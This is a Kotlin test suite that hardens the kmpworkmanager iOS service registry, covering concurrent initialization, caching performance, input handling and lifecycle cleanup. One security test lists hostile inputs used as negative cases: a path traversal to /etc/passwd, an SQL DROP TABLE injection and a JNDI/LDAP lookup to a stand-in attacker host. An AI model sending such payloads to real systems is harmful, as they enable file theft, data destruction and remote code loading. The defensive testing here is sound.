package dev.brewkits.kmpworkmanager

import dev.brewkits.kmpworkmanager.background.data.IosWorker
import dev.brewkits.kmpworkmanager.background.data.IosWorkerFactory
import dev.brewkits.kmpworkmanager.background.domain.TaskEventManager
import dev.brewkits.kmpworkmanager.background.domain.WorkerEnvironment
import dev.brewkits.kmpworkmanager.background.domain.WorkerResult
import dev.brewkits.kmpworkmanager.utils.Logger
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.awaitAll
import kotlinx.coroutines.launch
import kotlinx.coroutines.test.runTest
import kotlinx.coroutines.withContext
import kotlin.test.AfterTest
import kotlin.test.BeforeTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertSame
import kotlin.test.assertTrue
import kotlin.time.measureTime

/**
 * Hardening suite for the `IosServiceRegistry` introduced in 3.3.0 (discussion #66).
 *
 * `V330KoinFreeInitTest` pins the *functional* wiring contract. This file covers the
 * non-functional axes the release checklist calls for — concurrency/stress, performance,
 * security-relevant input handling, and lifecycle integration — for the same surface.
 *
 * **Do not touch `backgroundTaskScheduler` here.** See the note on `V330KoinFreeInitTest`:
 * constructing `NativeTaskScheduler` launches a `StorageMigration` job on a long-lived
 * scope that outlives the test method and breaks Gradle's XML writer for whichever
 * concurrency class runs next.
 */
class V330RegistryHardeningTest {

    private class NoopWorker : IosWorker {
        override suspend fun doWork(input: String?, env: WorkerEnvironment): WorkerResult =
            WorkerResult.Success()
    }

    private class TestIosWorkerFactory(val id: Int = 0) : IosWorkerFactory {
        override fun createWorker(workerClassName: String): IosWorker? =
            if (workerClassName == "NoopWorker") NoopWorker() else null
    }

    // All iOS test classes share one Kotlin/Native test process, and Gradle's XML result
    // writer is not thread-safe. An init/shutdown loop at the default INFO level floods
    // that shared stdout and makes unrelated classes fail with
    // "Could not write XML test results" — CI caught exactly this on iOS 17/18 while
    // iOS 16 and every local run stayed green. Keep these tests quiet.
    private val quiet = KmpWorkManagerConfig(logLevel = Logger.Level.ERROR)

    @BeforeTest
    fun setUp() = reset()

    @AfterTest
    fun tearDown() = reset()

    private fun reset() {
        KmpWorkManager.shutdown()
        TaskEventManager.resetForTest()
        KmpWorkManagerRuntime.reset()
    }

    // ── Concurrency / stress ────────────────────────────────────────────────────

    @Test
    fun `stress - concurrent initialize calls elect exactly one registry`() = runTest {
        // The old Koin path was guarded by the container's own locking. The replacement
        // relies on a single compare-and-set, so a race here would either install two
        // graphs or run the global registration side effects twice.
        withContext(Dispatchers.Default) {
            val racers = (1..8).map { i ->
                async { KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(i), config = quiet) }
            }
            racers.awaitAll()
        }

        assertTrue(KmpWorkManager.isInitialized())
        val store = KmpWorkManager.getInstance().eventStore
        assertSame(
            store,
            TaskEventManager.currentStoreForTest(),
            "Exactly one registry must win, and it must be the one wired globally"
        )
        // Every accessor must agree after the race — no torn publication.
        repeat(50) { assertSame(store, KmpWorkManager.getInstance().eventStore) }
    }

    @Test
    fun `stress - concurrent readers never observe a partially built registry`() = runTest {
        KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(), config = quiet)
        val expected = KmpWorkManager.getInstance().singleTaskExecutor

        withContext(Dispatchers.Default) {
            val readers = (1..16).map {
                async {
                    repeat(20) {
                        // `by lazy` must be thread-safe: a non-synchronized lazy would hand
                        // different instances to concurrent first-callers.
                        assertSame(expected, KmpWorkManager.getInstance().singleTaskExecutor)
                    }
                    true
                }
            }
            assertTrue(readers.awaitAll().all { it })
        }
    }

    @Test
    fun `stress - repeated init-shutdown cycles do not leak global registrations`() = runTest {
        // Each cycle must fully release the global hooks; a leak here is what the
        // shutdown() fix addressed, and a loop is what would catch a partial fix.
        repeat(10) {
            KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(), config = quiet)
            assertNotNull(KmpWorkManagerRuntime.executionHistoryStore)
            assertNotNull(TaskEventManager.currentStoreForTest())

            KmpWorkManager.shutdown()
            assertNull(KmpWorkManagerRuntime.executionHistoryStore)
            assertNull(TaskEventManager.currentStoreForTest())
            assertFalse(KmpWorkManager.isInitialized())
        }
    }

    @Test
    fun `stress - concurrent shutdown and getInstance never yields a stale registry`() = runTest {
        repeat(5) {
            KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(), config = quiet)
            withContext(Dispatchers.Default) {
                val shutdownJob = launch { KmpWorkManager.shutdown() }
                val readerJob = launch {
                    repeat(10) {
                        // Either a live registry or a clean IllegalStateException — never a
                        // half-torn-down object.
                        runCatching { KmpWorkManager.getInstance().eventStore }
                    }
                }
                shutdownJob.join()
                readerJob.join()
            }
            assertFalse(KmpWorkManager.isInitialized())
        }
    }

    // ── Performance ─────────────────────────────────────────────────────────────

    @Test
    fun `performance - initialize is cheap enough for Application onCreate`() {
        // initialize() runs on the startup path, so it must not do real work eagerly.
        // The stores are constructed but their directory resolution is itself `by lazy`,
        // so no file I/O should happen here. Threshold is deliberately loose — this
        // catches "someone made init do disk I/O", not microsecond regressions.
        val elapsed = measureTime {
            repeat(20) {
                KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(), config = quiet)
                KmpWorkManager.shutdown()
            }
        }
        assertTrue(
            elapsed.inWholeMilliseconds < 2_000,
            "20 init/shutdown cycles took ${elapsed.inWholeMilliseconds}ms — initialize() " +
                "should not be doing eager I/O on the startup path"
        )
    }

    @Test
    fun `performance - resolved services are cached not rebuilt per access`() {
        KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(), config = quiet)
        // Warm the lazy.
        KmpWorkManager.getInstance().singleTaskExecutor

        val elapsed = measureTime {
            repeat(10_000) { KmpWorkManager.getInstance().singleTaskExecutor }
        }
        assertTrue(
            elapsed.inWholeMilliseconds < 1_000,
            "10k cached lookups took ${elapsed.inWholeMilliseconds}ms — the registry is " +
                "rebuilding instead of caching"
        )
    }

    // ── Security-relevant input handling ────────────────────────────────────────

    @Test
    fun `security - a factory returning null for unknown workers cannot be coerced`() {
        KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(), config = quiet)
        val factory = KmpWorkManager.getInstance().singleTaskExecutor

        assertNotNull(factory)
        // Hostile / malformed worker class names must resolve to null rather than
        // throwing or resolving to an unrelated worker.
        val hostile = listOf(
            "../../etc/passwd",
            "NoopWorker Evil",
            "'; DROP TABLE workers; --",
            "\${jndi:ldap://evil.example.com/a}",
            "",
            " ".repeat(10_000)
        )
        val testFactory = TestIosWorkerFactory()
        hostile.forEach { name ->
            assertNull(
                testFactory.createWorker(name),
                "Factory must not resolve a worker for hostile input: '$name'"
            )
        }
    }

    @Test
    fun `security - initialize rejects an unusable factory before publishing any state`() {
        // Fail-fast must happen *before* the registry is published; otherwise a partially
        // configured library would be reachable via getInstance() after a failed init.
        class NotAnIosFactory : dev.brewkits.kmpworkmanager.background.domain.WorkerFactory {
            override fun createWorker(workerClassName: String) = null
        }

        assertFailsWith<IllegalArgumentException> {
            KmpWorkManager.initialize(workerFactory = NotAnIosFactory(), config = quiet)
        }
        assertFalse(KmpWorkManager.isInitialized())
        assertFailsWith<IllegalStateException> { KmpWorkManager.getInstance() }
        assertNull(KmpWorkManagerRuntime.executionHistoryStore)
        assertNull(
            TaskEventManager.currentStoreForTest(),
            "A rejected init must not have claimed the global TaskEventManager"
        )
    }

    // ── Integration / system ────────────────────────────────────────────────────

    @Test
    fun `integration - config values propagate to the runtime container`() {
        val config = KmpWorkManagerConfig(
            logLevel = Logger.Level.ERROR,
            minBatteryLevelPercent = 42
        )
        KmpWorkManager.initialize(workerFactory = TestIosWorkerFactory(), config = config)

        assertEquals(
            42,
            KmpWorkManagerRuntime.minBatteryLevelPercent,
            "initialize() must forward config to KmpWorkManagerRuntime, as the Koin module did"
        )
    }

    @Test
    fun `integration - the worker factory reaching the executor is the one passed in`() {
        // End-to-end proof that the registry wires the caller's factory through rather
        // than constructing its own — the whole point of the WorkerFactory contract.
        val factory = TestIosWorkerFactory(id = 7)
        KmpWorkManager.initialize(workerFactory = factory, config = quiet)

        assertNotNull(KmpWorkManager.getInstance().singleTaskExecutor)
        assertEquals(
            "NoopWorker",
            (factory.createWorker("NoopWorker") as? NoopWorker)?.let { "NoopWorker" },
            "The factory instance must remain functional after being handed to the registry"
        )
    }
}
